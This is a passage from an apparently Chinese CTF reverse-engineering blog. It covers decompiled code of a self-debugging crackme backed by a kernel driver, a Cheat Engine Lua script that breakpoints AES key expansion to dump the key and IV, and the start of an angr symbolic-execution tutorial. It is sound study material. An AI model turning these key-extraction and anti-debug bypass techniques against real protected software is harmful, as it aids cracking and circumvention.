[rsp+40h] [rbp-C0h] BYREF</span></span><br><span class="line">  CONTEXT Context; <span class="comment">// [rsp+50h] [rbp-B0h] BYREF</span></span><br><span class="line">  _OWORD v20[<span class="number">4</span>]; <span class="comment">// [rsp+520h] [rbp+420h] BYREF</span></span><br><span class="line">  _OWORD v21[<span class="number">4</span>]; <span class="comment">// [rsp+560h] [rbp+460h] BYREF</span></span><br><span class="line">  _OWORD v22[<span class="number">4</span>]; <span class="comment">// [rsp+5A0h] [rbp+4A0h] BYREF</span></span><br><span class="line">  _OWORD v23[<span class="number">4</span>]; <span class="comment">// [rsp+5E0h] [rbp+4E0h] BYREF</span></span><br><span class="line">  _OWORD v24[<span class="number">4</span>]; <span class="comment">// [rsp+620h] [rbp+520h] BYREF</span></span><br><span class="line">  _OWORD v25[<span class="number">4</span>]; <span class="comment">// [rsp+660h] [rbp+560h] BYREF</span></span><br><span class="line">  _OWORD v26[<span class="number">4</span>]; <span class="comment">// [rsp+6A0h] [rbp+5A0h] BYREF</span></span><br><span class="line">  _OWORD v27[<span class="number">4</span>]; <span class="comment">// [rsp+6E0h] [rbp+5E0h] BYREF</span></span><br><span class="line">  _OWORD v28[<span class="number">4</span>]; <span class="comment">// [rsp+720h] [rbp+620h] BYREF</span></span><br><span class="line">  _OWORD v29[<span class="number">4</span>]; <span class="comment">// [rsp+760h] [rbp+660h] BYREF</span></span><br><span class="line">  _OWORD v30[<span class="number">4</span>]; <span class="comment">// [rsp+7A0h] [rbp+6A0h] BYREF</span></span><br><span class="line">  _OWORD v31[<span class="number">4</span>]; <span class="comment">// [rsp+7E0h] [rbp+6E0h] BYREF</span></span><br><span class="line">  _OWORD v32[<span class="number">4</span>]; <span class="comment">// [rsp+820h] [rbp+720h] BYREF</span></span><br><span class="line">  _OWORD v33[<span class="number">4</span>]; <span class="comment">// [rsp+860h] [rbp+760h] BYREF</span></span><br><span class="line">  _OWORD v34[<span class="number">4</span>]; <span class="comment">// [rsp+8A0h] [rbp+7A0h] BYREF</span></span><br><span class="line">  _OWORD v35[<span class="number">4</span>]; <span class="comment">// [rsp+8E0h] [rbp+7E0h] BYREF</span></span><br><span class="line">  _OWORD v36[<span class="number">4</span>]; <span class="comment">// [rsp+920h] [rbp+820h] BYREF</span></span><br><span class="line">  _OWORD v37[<span class="number">4</span>]; <span class="comment">// [rsp+960h] [rbp+860h] BYREF</span></span><br><span class="line">  _OWORD v38[<span class="number">4</span>]; <span class="comment">// [rsp+9A0h] [rbp+8A0h] BYREF</span></span><br><span class="line">  _OWORD v39[<span class="number">4</span>]; <span class="comment">// [rsp+9E0h] [rbp+8E0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v1 = *(_OWORD *)&amp;debug_event-&gt;u.Exception.ExceptionRecord.ExceptionCode;</span><br><span class="line">  *(_OWORD *)&amp;Context.P1Home = *(_OWORD *)&amp;debug_event-&gt;dwDebugEventCode;</span><br><span class="line">  v2 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">1</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.P3Home = v1;</span><br><span class="line">  v3 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">2</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.P5Home = v2;</span><br><span class="line">  v4 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">3</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.ContextFlags = v3;</span><br><span class="line">  v5 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">4</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.SegGs = v4;</span><br><span class="line">  v6 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">5</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.Dr1 = v5;</span><br><span class="line">  v7 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">7</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.Dr3 = v6;</span><br><span class="line">  *(_OWORD *)&amp;Context.Dr7 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">6</span>);</span><br><span class="line">  v8 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">8</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.Rcx = v7;</span><br><span class="line">  v9 = *((_OWORD *)&amp;debug_event-&gt;u.RipInfo + <span class="number">9</span>);</span><br><span class="line">  *(_OWORD *)&amp;Context.Rbx = v8;</span><br><span class="line">  *(_OWORD *)&amp;Context.Rbp = v9;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(Context.P1Home) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( LODWORD(Context.P1Home) == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      hProcess = (HANDLE)Context.P4Home;</span><br><span class="line">      hThread = (HANDLE)Context.P5Home;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="keyword">register</span>() )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        FileA = CreateFileA(<span class="string">&quot;\\\\.\\BrownProtectorDeviceLink&quot;</span>, <span class="number">0xC0000000</span>, <span class="number">3u</span>, <span class="number">0LL</span>, <span class="number">3u</span>, <span class="number">4u</span>, <span class="number">0LL</span>);</span><br><span class="line">        hObject = FileA;</span><br><span class="line">        <span class="keyword">if</span> ( FileA != (HANDLE)<span class="number">-1LL</span></span><br><span class="line">          &amp;&amp; DeviceIoControl(FileA, <span class="number">0x224000</span>u, <span class="number">0LL</span>, <span class="number">0</span>, &amp;OutBuffer, <span class="number">8u</span>, <span class="number">0LL</span>, <span class="number">0LL</span>)</span><br><span class="line">          &amp;&amp; OutBuffer == <span class="number">0x1337</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v20[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BD0);</span><br><span class="line">          v21[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B20);</span><br><span class="line">          v22[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C10);</span><br><span class="line">          v23[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BE0);</span><br><span class="line">          v24[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B00);</span><br><span class="line">          v25[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005AC0);</span><br><span class="line">          v26[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C30);</span><br><span class="line">          v27[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BA0);</span><br><span class="line">          v28[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B80);</span><br><span class="line">          v29[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BC0);</span><br><span class="line">          v30[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BB0);</span><br><span class="line">          v31[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B30);</span><br><span class="line">          v32[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B60);</span><br><span class="line">          v33[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005AD0);</span><br><span class="line">          v34[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C40);</span><br><span class="line">          v35[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005AE0);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v20[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v21[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v22[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v23[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v24[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v25[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v26[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v27[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v28[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v29[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v30[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v31[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v32[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v33[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v34[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v35[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          Context.P1Home = (DWORD64)v20;</span><br><span class="line">          v36[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B70);</span><br><span class="line">          v12 = <span class="number">0LL</span>;</span><br><span class="line">          Context.P2Home = (DWORD64)v21;</span><br><span class="line">          Context.P3Home = (DWORD64)v22;</span><br><span class="line">          Context.P4Home = (DWORD64)v23;</span><br><span class="line">          Context.P5Home = (DWORD64)v24;</span><br><span class="line">          Context.P6Home = (DWORD64)v25;</span><br><span class="line">          *(_QWORD *)&amp;Context.ContextFlags = v26;</span><br><span class="line">          *(_QWORD *)&amp;Context.SegCs = v27;</span><br><span class="line">          *(_QWORD *)&amp;Context.SegGs = v28;</span><br><span class="line">          Context.Dr0 = (DWORD64)v29;</span><br><span class="line">          Context.Dr1 = (DWORD64)v30;</span><br><span class="line">          Context.Dr2 = (DWORD64)v31;</span><br><span class="line">          Context.Dr3 = (DWORD64)v32;</span><br><span class="line">          Context.Dr6 = (DWORD64)v33;</span><br><span class="line">          Context.Dr7 = (DWORD64)v34;</span><br><span class="line">          Context.Rax = (DWORD64)v35;</span><br><span class="line">          Context.Rcx = (DWORD64)v36;</span><br><span class="line">          v37[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B40);</span><br><span class="line">          Context.Rdx = (DWORD64)v37;</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v36[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          Context.Rbx = (DWORD64)v38;</span><br><span class="line">          Context.Rsp = (DWORD64)v39;</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v37[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          v38[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005B10);</span><br><span class="line">          <span class="built_in">memset</span>(&amp;v38[<span class="number">1</span>], <span class="number">0</span>, <span class="number">48</span>);</span><br><span class="line">          v39[<span class="number">0</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C00);</span><br><span class="line">          v39[<span class="number">1</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005C20);</span><br><span class="line">          v39[<span class="number">2</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005AF0);</span><br><span class="line">          v39[<span class="number">3</span>] = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_140005BF0);</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v13 = VirtualAlloc(<span class="number">0LL</span>, <span class="number">0x800</span>uLL, <span class="number">0x3000</span>u, <span class="number">4u</span>);</span><br><span class="line">            (&amp;in)[v12] = v13;</span><br><span class="line">            <span class="keyword">if</span> ( !v13 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">            v14 = *(_OWORD **)((<span class="type">char</span> *)&amp;Context.P1Home + v12 * <span class="number">8</span>);</span><br><span class="line">            ++v10;</span><br><span class="line">            v15 = (&amp;in)[v12++];</span><br><span class="line">            *v15 = *v14;</span><br><span class="line">            v15[<span class="number">1</span>] = v14[<span class="number">1</span>];</span><br><span class="line">            v15[<span class="number">2</span>] = v14[<span class="number">2</span>];</span><br><span class="line">            v15[<span class="number">3</span>] = v14[<span class="number">3</span>];</span><br><span class="line">            <span class="keyword">if</span> ( v10 &gt;= <span class="number">20</span> )</span><br><span class="line">              <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          TerminateProcess(hProcess, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( LODWORD(Context.P1Home) != <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(Context.P3Home) == <span class="number">0xC0000094</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Context.ContextFlags = <span class="number">0x10001F</span>;</span><br><span class="line">    GetThreadContext(hThread, &amp;Context);</span><br><span class="line">    <span class="keyword">switch</span> ( Context.Rax )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">        print(<span class="string">&quot;Welcome! Give me the key and I will give you the flag: &quot;</span>);</span><br><span class="line">        input(<span class="string">&quot;%128s&quot;</span>, in);</span><br><span class="line">        lenth = <span class="number">-1LL</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          ++lenth;</span><br><span class="line">        <span class="keyword">while</span> ( in[lenth] );</span><br><span class="line">        <span class="keyword">if</span> ( lenth != <span class="number">0x40</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Wrong1&quot;</span>);</span><br><span class="line">          TerminateProcess(hProcess, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        DeviceIoControl(hObject, <span class="number">0x224008</span>u, &amp;in, <span class="number">0xA0</span>u, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Correct. Here is your flag&quot;</span>);</span><br><span class="line">        decrypt((__int64)in);</span><br><span class="line">        Context.Rip += <span class="number">6LL</span>;</span><br><span class="line">        Context.Rax = <span class="number">0LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong0&quot;</span>);</span><br><span class="line">        Context.Rip += <span class="number">6LL</span>;</span><br><span class="line">        Context.Rax = <span class="number">0LL</span>;</span><br><span class="line">LABEL_29:</span><br><span class="line">        SetThreadContext(hThread, &amp;Context);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Context.Rip += <span class="number">6LL</span>;</span><br><span class="line">    Context.Rax = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( LODWORD(Context.P3Home) == <span class="number">0xC0000005</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Context.ContextFlags = <span class="number">0x10001F</span>;</span><br><span class="line">    GetThreadContext(hThread, &amp;Context);</span><br><span class="line">    Context.Rip += <span class="number">8LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DEBUG_EVENT v4; <span class="comment">// [rsp+50h] [rbp-308h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [rsp+100h] [rbp-258h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [rsp+120h] [rbp-238h] BYREF</span></span><br><span class="line">  _DEBUG_EVENT DebugEvent; <span class="comment">// [rsp+190h] [rbp-1C8h] BYREF</span></span><br><span class="line">  CHAR Filename[<span class="number">256</span>]; <span class="comment">// [rsp+240h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( IsDebuggerPresent() )</span><br><span class="line">    child();</span><br><span class="line">  GetModuleFileNameA(<span class="number">0LL</span>, Filename, <span class="number">0x100</span>u);</span><br><span class="line">  StartupInfo.cb = <span class="number">0x68</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo.cb + <span class="number">1</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;ProcessInformation, <span class="number">0</span>, <span class="keyword">sizeof</span>(ProcessInformation));</span><br><span class="line">  <span class="keyword">if</span> ( CreateProcessA(Filename, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = DebugEvent;</span><br><span class="line">      <span class="keyword">if</span> ( !handler(&amp;v4) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, <span class="number">0x10002</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hObject);</span><br><span class="line">    nop_();</span><br><span class="line">    nop();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[!] Can&#x27;t create child process&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一题就是如果不调试子进程就会非常困难的例子 本题的校验和加密全部在<code>child()</code>中 <code>handler()</code>只起到接收数据和初始化一些数据的功能 而正常来说Windows进程有自己独立的一块虚拟内存 不同进程之间不允许访问对方内存 所以这题通过一个驱动程序(.sys)直接得到所有数据的物理地址并进过一系列处理再传给<code>child()</code>中的<code>vm()</code>(太长不放) 当作AES加密的密钥和iv 而内核对内存资源的管理和使用要经过虚拟内存转物理内存再根据四级内存页来获取内存固定的最后几位进行组合 之后才能操作用户进程的资源 而且<a href="https://1k0ct.github.io/2024/09/28/IDA%E9%85%8D%E5%90%88VMware%E8%BF%9B%E8%A1%8C%E5%86%85%E6%A0%B8-%E9%A9%B1%E5%8A%A8-%E8%B0%83%E8%AF%95/">内核调试</a>的前置条件比较多 所以选择用CE调试</p>
<p>开启DBVM需要先开启CPU虚拟化 这里用CE的Lua引擎使用CE的API来Hook AES密钥扩展步骤来获取密钥和iv</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-131338.png" alt="image-20240928131338013"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-131519.png" alt="image-20240928131519855"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-132928.png" alt="image-20240928132928505"></p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-133209.png" alt="image-20240928133209644"></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexstr</span><span class="params">(bt)</span></span></span><br><span class="line">    <span class="keyword">local</span> hexstring = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> _, <span class="built_in">byte</span> <span class="keyword">in</span> <span class="built_in">ipairs</span>(bt) <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">table</span>.<span class="built_in">insert</span>(hexstring, <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;0x%02x&quot;</span>, <span class="built_in">byte</span>))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">table</span>.<span class="built_in">concat</span>(hexstring, <span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">debug_setBreakpoint(<span class="number">0x7FF7BE131000</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> key = hexstr(readBytes(RDX, <span class="number">16</span>, <span class="literal">true</span>))</span><br><span class="line">    <span class="keyword">local</span> iv  = hexstr(readBytes(RBX, <span class="number">16</span>, <span class="literal">true</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;[%s],\n[%s],\n&quot;</span>, key, iv))</span><br><span class="line"><span class="keyword">end</span>)</span><br><span class="line"></span><br><span class="line">debug_setBreakpoint(<span class="number">0x7FF7BE132741</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> enc = hexstr(readBytes(RDX, <span class="number">0x40</span>, <span class="literal">true</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;[%s]&quot;</span>, enc))</span><br><span class="line"><span class="keyword">end</span>)</span><br></pre></td></tr></table></figure>

<p>CE脚本相较于IDA脚本更容易编写 因为Lua引擎在导入脚本时自动加入了包括寄存器的全局变量可以直接使用</p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>angr学习记录</title>
    <url>/2024/07/18/angr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="Angr简介"><a href="#Angr简介" class="headerlink" title="Angr简介"></a>Angr简介</h2><p>Angr提供了一个处理二进制文件的框架 主流的指令集指令在被载入<code>CLE</code>框架后 会根据功能被抽象为中间语言(IL) Angr提供的就是处理这些被载入为IL的程序 可以用来实现自动化的程序调试 例如直接载入程序然后像模拟的标准输入流输入数据以达到直接利用原程序进行爆破的目的 同时Angr还内置了约束求解器</p>
<span id="more"></span>

<h2 id="做做题"><a href="#做做题" class="headerlink" title="做做题"></a>做做题</h2><p>下面跟着<a href="https://github.com/jakespringer/angr_ctf">Angr-ctf</a>里的题目学习Angr的基础应用</p>
<h3 id="angr-find"><a href="#angr-find" class="headerlink" title="angr_find"></a>angr_find</h3><p>IDA加载附件看一下代码:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">complex_function</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">64</span> || a1 &gt; <span class="number">90</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">3</span> * a2 + a1 - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">9</span>]; <span class="comment">// [esp+23h] [ebp-15h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = complex_function(s1[i], i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;JACEJGCS&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>显然目标是要进入输出”Good Job.”的分支</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/18/20240718-201751.png" alt="image-20240718201531013"></p>
<p>用angr爆破:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;00_angr_find&#x27;</span>, load_options=&#123;<span class="string">&#x27;auto_load_libs&#x27;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line"><span class="comment">#载入二进制程序 并且禁用自动加载外部动态连接选项 得到project对象</span></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line"><span class="comment">#然后获取当前的模拟程序对象(SimState) factory成员拥有一系列载入二进制文件的属性和处理方法 而simstate则包含调试过程中的寄存器, 内存等信息</span></span><br><span class="line">simg = proj.factory.simgr(state)</span><br><span class="line"><span class="comment">#开始符号执行载入的程序</span></span><br><span class="line">simg.explore(find=<span class="number">0x8048675</span>, avoid=<span class="number">0x8048663</span>)</span><br><span class="line"><span class="comment">#设定程序预期到达的地址和预期避免的地址</span></span><br><span class="line"><span class="built_in">print</span>(simg.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#从标准输入流获取结果</span></span><br></pre></td></tr></table></figure>

<h3 id="angr-find-condition"><a href="#angr-find-condition" class="headerlink" title="angr_find_condition"></a>angr_find_condition</h3><p>主函数进行了混淆 加入了很多实际上控制流不会经过的块 不过还好IDA的反汇编功能比较强大 伪代码看起来还是很清晰的:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/19/20240719-153407.png" alt="image-20240719153400747"></p>
